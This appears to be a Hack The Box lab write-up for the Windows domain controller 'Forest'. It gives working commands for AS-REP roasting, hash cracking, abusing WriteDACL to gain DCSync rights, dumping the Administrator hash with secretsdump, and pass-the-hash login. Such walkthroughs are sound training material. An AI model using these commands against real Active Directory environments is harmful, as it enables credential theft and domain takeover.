@@ -1,0 +1,132 @@
+# Forest — Hack The Box
+
+| | |
+|---|---|
+| **Platform** | Hack The Box |
+| **OS** | Windows |
+| **Difficulty** | Easy |
+| **Domain** | `htb.local` / `FOREST.htb.local` |
+
+## Synopsis
+
+Forest is an easy Windows **Active Directory** Domain Controller (with Exchange installed).
+Anonymous LDAP/RPC enumeration lists domain users, and the service account `svc-alfresco` has
+**"Do not require Kerberos pre-authentication"** set, allowing an **AS-REP Roasting** attack.
+The retrieved hash cracks offline, giving WinRM access. BloodHound shows `svc-alfresco` is
+(transitively) a member of **Account Operators** and **Exchange Windows Permissions**, which
+holds **WriteDACL** over the domain. That right is abused to grant a controlled principal
+**DCSync** rights, dump the Administrator NT hash, and log in via **Pass-the-Hash**.
+
+---
+
+## Enumeration
+
+### Nmap
+
+```bash
+nmap -p- --min-rate=5000 -T4 <target>
+nmap -p53,88,135,139,389,445,464,593,636,5985,9389 -sCV <target>
+```
+
+DNS, Kerberos, LDAP, SMB, WinRM, plus the Exchange-related `9389` (ADWS). Add
+`htb.local` and `forest.htb.local` to `/etc/hosts`.
+
+![Nmap scan of the Domain Controller](../images/forest-01-nmap.png)
+
+### Enumerating users (anonymous)
+
+```bash
+rpcclient -U "" -N <target> -c "enumdomusers"
+# or
+crackmapexec smb <target> --users
+```
+
+This yields the user list, including service accounts such as **svc-alfresco**.
+
+![rpcclient enumdomusers listing domain accounts](../images/forest-02-enumdomusers.png)
+
+---
+
+## Foothold — AS-REP Roasting
+
+`svc-alfresco` does not require Kerberos pre-authentication, so an AS-REP can be requested and
+cracked offline:
+
+```bash
+GetNPUsers.py htb.local/ -usersfile users.txt -no-pass -dc-ip <target>
+# $krb5asrep$23$svc-alfresco@HTB.LOCAL:...
+```
+
+![GetNPUsers retrieving the AS-REP hash for svc-alfresco](../images/forest-03-asreproast.png)
+
+Crack it:
+
+```bash
+hashcat -m 18200 asrep.hash /usr/share/wordlists/rockyou.txt
+# svc-alfresco : s3rvice
+```
+
+Log in over WinRM:
+
+```bash
+evil-winrm -i <target> -u svc-alfresco -p 's3rvice'
+```
+
+The **user flag** is in `C:\Users\svc-alfresco\Desktop\user.txt`.
+
+---
+
+## Privilege Escalation — Exchange WriteDACL → DCSync
+
+Run BloodHound:
+
+```bash
+bloodhound-python -u svc-alfresco -p 's3rvice' -d htb.local -ns <target> -c all
+```
+
+`svc-alfresco` is a member of **Account Operators** and (via group nesting) of **Exchange
+Windows Permissions**, which has **WriteDACL** on the domain object. The attack path:
+
+1. Create a user (Account Operators can create users) and add it to Exchange Windows
+   Permissions — or operate directly as `svc-alfresco`:
+
+   ```powershell
+   net user hacker Hacker123! /add /domain
+   net group "Exchange Windows Permissions" hacker /add
+   ```
+
+2. Using that WriteDACL right, grant the controlled account **DCSync** (DS-Replication-Get-
+   Changes / -All) over the domain:
+
+   ```powershell
+   # with PowerView loaded
+   $pass = ConvertTo-SecureString 'Hacker123!' -AsPlainText -Force
+   $cred = New-Object System.Management.Automation.PSCredential('htb\hacker',$pass)
+   Add-DomainObjectAcl -Credential $cred -TargetIdentity 'DC=htb,DC=local' \
+     -PrincipalIdentity hacker -Rights DCSync
+   ```
+
+![BloodHound path: svc-alfresco → Exchange Windows Permissions → WriteDACL → domain](../images/forest-04-bloodhound-path.png)
+
+3. DCSync the Administrator hash:
+
+   ```bash
+   secretsdump.py htb.local/hacker:'Hacker123!'@<target> -just-dc-user Administrator
+   # Administrator:500:aad3b...:<admin-nt-hash>:::
+   ```
+
+4. Pass-the-Hash to SYSTEM:
+
+   ```bash
+   psexec.py htb.local/Administrator@<target> -hashes :<admin-nt-hash>
+   # or: evil-winrm -i <target> -u Administrator -H <admin-nt-hash>
+   ```
+
+![secretsdump via DCSync and PtH as Administrator](../images/forest-05-dcsync-pth.png)
+
+```
+C:\> whoami
+htb\administrator
+```
+
+The **root flag** is in `C:\Users\Administrator\Desktop\root.txt`.
